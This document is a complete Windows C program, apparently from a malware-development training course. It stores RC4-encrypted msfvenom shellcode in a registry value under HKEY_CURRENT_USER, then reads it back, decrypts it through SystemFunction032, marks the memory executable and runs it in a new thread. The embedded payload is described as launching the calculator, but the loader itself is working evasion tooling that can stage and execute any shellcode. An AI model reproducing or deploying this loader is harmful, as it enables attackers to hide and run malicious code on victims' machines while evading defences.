#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "Advapi32.lib")  // Used to compile RegGetValueA

// Uncomment one of the following to enable read / write mode:
//\
# define WRITEMODE
//
#define READMODE

#define REGISTRY	"Control Panel"
#define REGSTRING	"MalDevAcademy"

#ifdef READMODE

// Output from HellShell: `HellShell.exe calc.bin rc4`

typedef struct {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS        STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

unsigned char Rc4Key[] = {
		0xE1, 0xE4, 0xA1, 0xC9, 0x28, 0xBB, 0x60, 0x02, 0x58, 0xD0, 0x6E, 0x34, 0xF4, 0xB1, 0xF0, 0x7E
};


BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

	LSTATUS		status = NULL;
	
	DWORD		dwBytesRead = NULL;	
	PVOID		pBytes = NULL;

	/*
	* LSTATUS RegGetValueA(
		[in]                HKEY    hkey,     // A handle to an open registry key
		[in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
		[in, optional]      LPCSTR  lpValue,  // The name of the registry value.
		[in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
		[out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
		[out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
		[in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
	* );
	*/
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea

	// Fetch the payload's size
	status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegGetValueA failed with error: %d\n", status);
		return FALSE;
	}

	// Allocate heap that will store the payload being read
	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
	if (pBytes == NULL) {
		printf("[!] HeapAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	// Read the payload from the `REGISTRY` key, from value `REGSTRING`
	status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegGetValueA failed with error: %d\n", status);
		return FALSE;
	}

	// Save values
	*ppPayload = pBytes;
	*psSize = dwBytesRead;

	return TRUE;

}

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID	pShellcodeAddress = NULL;
	DWORD	dwOldProtection = NULL;

	/*
	* LPVOID VirtualAlloc(
		 [in, optional] LPVOID lpAddress,
		 [in]           SIZE_T dwSize,
		 [in]           DWORD  flAllocationType,
		 [in]           DWORD  flProtect
	* );	
	*/

	/*
	* BOOL VirtualProtect(
		 [in]  LPVOID lpAddress,
		 [in]  SIZE_T dwSize,
		 [in]  DWORD  flNewProtect,
		 [out] PDWORD lpflOldProtect
	* );
	*/

	/*
	* HANDLE CreateThread(
		[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		[in]            SIZE_T                  dwStackSize,
		[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
		[in, optional]  __drv_aliasesMem LPVOID lpParameter,
		[in]            DWORD                   dwCreationFlags,
		[out, optional] LPDWORD                 lpThreadId
	* );
	*/

	// Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.
	// Memory allocated by this function is automatically initialized to zero.
	// To allocate memory in the address space of another process, use the VirtualAllocEx function.
	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated memory at: 0x%p\n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
	memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

	// Changes the protection on a region of committed pages in the virtual address space of the calling process.
	// To change the access protection of any process, use the VirtualProtectEx function.
	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("Press <Enter> to run...");
	getchar();

	// Creates a thread to execute within the virtual address space of the calling process.
	// To create a thread that runs in the virtual address space of another process, use the CreateRemoteThread function.
	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
	if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateThread failed with error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;

}

#endif  // READMODE

#ifdef WRITEMODE

// Msfvenom x64 calc shellcode encrypted by HellShell (RC4)
unsigned char Rc4CipherText[] = {
		0x56, 0xC2, 0x67, 0xA7, 0x1F, 0xB0, 0x24, 0x67, 0xB9, 0x90, 0xAA, 0x0A, 0xE5, 0x33, 0x86, 0x57,
		0xC4, 0xD8, 0x5A, 0xA6, 0x0A, 0x07, 0x65, 0x3D, 0xB6, 0x79, 0x8C, 0x3C, 0xC3, 0x9E, 0x3B, 0x83,
		0x45, 0x74, 0x08, 0x35, 0x6D, 0x73, 0x98, 0xA6, 0x0F, 0x45, 0x93, 0xDD, 0x4A, 0xA8, 0x46, 0x2D,
		0x3B, 0xF0, 0x00, 0x2B, 0xA4, 0x0D, 0x04, 0x52, 0x0A, 0x6C, 0x3F, 0x1D, 0xE2, 0x8B, 0xD6, 0xC2,
		0xCD, 0xFC, 0xCC, 0xD5, 0x61, 0xEF, 0x1E, 0x5A, 0xBB, 0x64, 0x31, 0x61, 0x99, 0x98, 0x9E, 0xE1,
		0x43, 0x5B, 0xA9, 0xCA, 0x14, 0x24, 0x62, 0x2F, 0x7D, 0x94, 0xA5, 0xF0, 0x57, 0x41, 0xCC, 0xD8,
		0xDE, 0x37, 0x9A, 0x48, 0xD8, 0xA2, 0xF6, 0x3A, 0x64, 0xE9, 0xB2, 0x6A, 0x8E, 0xA2, 0x98, 0xF6,
		0x88, 0x24, 0x5A, 0x8C, 0x78, 0x27, 0xC0, 0x5C, 0x98, 0x34, 0xBB, 0x91, 0x8D, 0x89, 0x95, 0x17,
		0xC1, 0xB2, 0x2A, 0x20, 0xF9, 0x26, 0x1C, 0x85, 0x4E, 0xC3, 0x36, 0x53, 0xFB, 0x20, 0xAD, 0xC5,
		0x3B, 0x1F, 0x22, 0x73, 0x01, 0xEC, 0xCF, 0x6F, 0x07, 0xB1, 0x3B, 0x56, 0xE7, 0x58, 0x53, 0xFB,
		0xB6, 0xC1, 0xE8, 0xA8, 0xD8, 0xEA, 0x4C, 0x72, 0x14, 0x77, 0xD9, 0x6E, 0x10, 0x8D, 0xDE, 0xC1,
		0x4B, 0x3C, 0x17, 0x39, 0x41, 0x72, 0x83, 0xD3, 0xC0, 0xA7, 0x05, 0x66, 0x0C, 0xFA, 0x53, 0x1F,
		0x62, 0x27, 0xEB, 0x54, 0x88, 0xE8, 0xBE, 0x6A, 0xD6, 0x06, 0x00, 0x3A, 0x34, 0xE8, 0x6D, 0xEF,
		0x16, 0xBB, 0x8F, 0x28, 0xDE, 0xBB, 0x87, 0xB9, 0xBB, 0x32, 0xAD, 0x3A, 0x0C, 0xB0, 0xAB, 0x06,
		0x57, 0x70, 0x89, 0xF7, 0xED, 0x74, 0xB7, 0xBB, 0x13, 0x6E, 0x7E, 0x6D, 0x7C, 0xF3, 0xD1, 0x67,
		0x76, 0xBB, 0xCB, 0x59, 0xC1, 0xCB, 0x39, 0xCF, 0x79, 0x4F, 0x60, 0x82, 0xB3, 0x28, 0x23, 0x34,
		0xBA, 0xA3, 0xEB, 0x93, 0x20, 0xE4, 0x99, 0xB2, 0xD5, 0xC0, 0xD2, 0x69, 0x04, 0x37, 0x1C, 0x2B,
		0x27, 0xCE, 0xC2, 0x1C
};

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

	BOOL		bState = TRUE;
	LSTATUS		status = NULL;
	HKEY		hKey = NULL;

	/*
	* LSTATUS RegOpenKeyExA(
		[in]           HKEY   hKey, 		// A handle to an open registry key
		[in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
		[in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
		[in]           REGSAM samDesired, 	// Access Rights
		[out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
	* );
	*/

	/*
	* LSTATUS RegSetValueExA(
		[in]           HKEY       hKey,            // A handle to an open registry key
		[in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
					   DWORD      Reserved,        // Set to 0
		[in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
		[in]           const BYTE *lpData,         // The data to be stored
		[in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
	* );
	*/

	printf("[i] Writing 0x%p [Size: %ld] to \"%s\\%s\"...\n", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

	// The RegOpenKeyExA WinAPI is used to open a handle to the specified registry key,
	// ... which is a prerequisite to creating, editing or deleting values under the registry key.
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
	status = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExA failed with error: %d\n", status);
		bState = FALSE;
		goto _EndOfFunction;
	}

	// The RegSetValueExA WinAPI is used which takes the opened handle from RegOpenKeyExA and creates a new value that is based on the second parameter, REGSTRING.
	// It will also write the payload to the newly created value.
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
	status = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegSetValueExA failed with error: %d\n", status);
		bState = FALSE;
		goto _EndOfFunction;
	}

	printf("[+] Done!\n");

_EndOfFunction:
	if (hKey)
		// RegCloseKey is used to close the handle of the registry key that was opened.
		// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
		RegCloseKey(hKey);
	return bState;

}

#endif  // WRITEMODE

int main(int argc, char* argv[]) {

#ifdef WRITEMODE

	// Write the shellcode to the registry
	printf("[#] Press <Enter> to write the shellcode to the registry...");
	getchar();
	if (!WriteShellcodeToRegistry(Rc4CipherText, sizeof(Rc4CipherText)))
		return -1;

	goto _EndOfFunction;

#endif  // WRITEMODE

#ifdef READMODE

	PVOID	pBytes = NULL;
	SIZE_T	sSize = NULL;

	printf("[#] Press <Enter> to read the shellcode from the registry...");
	getchar();

	// Read the shellcode
	printf("[i] Reading shellcode...\n");
	if (!ReadShellcodeFromRegistry(&pBytes, &sSize))
		return -1;
	printf("[+] DONE!\n");
	printf("[+] Payload of Size [%d] | Read at: 0x%p \n", sSize, pBytes);

	// Decrypt the shellcode
	printf("Press <Enter> to decrypt the shellcode...");
	getchar();
	printf("Decrypting shellcode...\n");
	if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBytes, sizeof(Rc4Key), sSize))
		return -1;
	printf("[+] DONE!\n");

	// Run the shellcode
	if (!RunShellcode(pBytes, sSize))
		return -1;

	HeapFree(GetProcessHeap(), 0, pBytes);

#endif  // READMODE

_EndOfFunction:
	printf("[#] Press <Enter> to quit...");
	getchar();
	return 0;

}